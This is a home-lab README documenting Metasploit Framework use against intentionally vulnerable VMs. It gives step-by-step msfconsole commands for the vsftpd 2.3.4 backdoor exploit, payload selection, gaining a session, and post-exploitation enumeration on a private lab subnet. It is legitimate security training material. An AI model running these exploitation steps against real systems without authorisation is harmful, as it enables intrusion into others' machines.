# Metasploit Framework

## Overview

Metasploit Framework is a penetration testing and exploitation framework used for vulnerability validation, payload delivery, post-exploitation activities, and security research.

This tool was used within the NCSA Cybersecurity Home Lab environment to perform controlled exploitation against intentionally vulnerable systems including Metasploitable2 and Windows virtual machines.

---

# Objectives

The primary objectives of using Metasploit Framework in this lab environment were:

- Understand exploitation workflows
- Perform vulnerability validation
- Gain remote shell access to vulnerable systems
- Use Meterpreter sessions
- Conduct post-exploitation enumeration
- Analyze attack chains and payload behavior
- Practice controlled offensive security techniques

---

# Lab Environment

| Component | Details |
|---|---|
| Operating System | Kali Linux |
| Hypervisor | VirtualBox |
| Tool | Metasploit Framework |
| Primary Target | Metasploitable2 |
| Lab Subnet | 10.0.2.0/24 |

---

# Core Features

- Exploit modules
- Payload generation
- Auxiliary scanning
- Meterpreter sessions
- Post-exploitation modules
- Credential attacks
- Session management
- Vulnerability validation

---

# Installation

## Verify Existing Installation

```bash
msfconsole --version
```

## Install on Kali Linux

```bash
sudo apt update
sudo apt install metasploit-framework
```

---

# Starting Metasploit

## Launch Framework Console

```bash
msfconsole
```

---

# Workspace Management

## Create Workspace

```bash
workspace -a ncsa-labs
```

## View Workspaces

```bash
workspace
```

---

# Searching for Exploits

## Search by Service

```bash
search vsftpd
```

## Search by Platform

```bash
search type:exploit platform:linux
```

---

# Selecting Exploits

## Use Exploit Module

```bash
use exploit/unix/ftp/vsftpd_234_backdoor
```

---

# Viewing Module Options

## Display Required Parameters

```bash
show options
```

---

# Configure Target Information

## Set Target Host

```bash
set RHOSTS 10.0.2.4
```

## Set Local Host

```bash
set LHOST 10.0.2.3
```

---

# Payloads

Payloads provide remote access or execute actions on the target system.

## View Payloads

```bash
show payloads
```

## Select Payload

```bash
set PAYLOAD cmd/unix/interact
```

---

# Exploitation

## Launch Exploit

```bash
run
```

Alternative:

```bash
exploit
```

---

# Meterpreter Sessions

Meterpreter provides advanced post-exploitation functionality.

## View Sessions

```bash
sessions
```

## Interact with Session

```bash
sessions -i 1
```

---

# Post-Exploitation

Common post-exploitation activities:
- system enumeration
- privilege escalation
- credential gathering
- process analysis
- persistence analysis

## System Information

```bash
sysinfo
```

## Current User

```bash
getuid
```

---

# Auxiliary Modules

Auxiliary modules are commonly used for:
- scanning
- enumeration
- brute-force attacks
- service discovery

## Example SMB Scan

```bash
use auxiliary/scanner/smb/smb_version
```

---

# Related Labs

- Metasploit to Metasploitable2
- Vulnerability Exploitation
- Post-Exploitation Enumeration
- Meterpreter Usage
- Service Enumeration

---

# Recommended Screenshots

Recommended screenshots for documentation:
- successful exploit execution
- Meterpreter session access
- shell interaction
- exploit module configuration
- payload selection
- target enumeration
- post-exploitation commands

---

# Common Commands

| Command | Purpose |
|---|---|
| msfconsole | Launch Metasploit |
| search | Search modules |
| use | Select module |
| show options | Display module settings |
| set | Configure variables |
| run | Execute exploit |
| sessions | View active sessions |

---

# Common Troubleshooting

## Exploit Failed

### Possible Causes
- incorrect target IP
- vulnerable service unavailable
- firewall restrictions
- incompatible payload

### Resolution
- verify target connectivity
- verify service version
- confirm exploit compatibility

---

## Session Not Created

### Resolution
- verify `LHOST`
- verify network connectivity
- verify payload selection
- disable firewall on lab targets if necessary

---

## Module Not Found

### Resolution

Update Metasploit Framework:

```bash
sudo msfupdate
```

---

# Lessons Learned

- Exploitation requires accurate service enumeration.
- Vulnerabilities depend heavily on software versions and configurations.
- Payload selection impacts exploitation success.
- Post-exploitation activities reveal additional system information and risks.

---

# Ethical Use Notice

All exploitation activities documented in this repository were conducted in a controlled educational environment for cybersecurity training purposes only.

Do not perform unauthorized exploitation or penetration testing against systems without explicit authorization.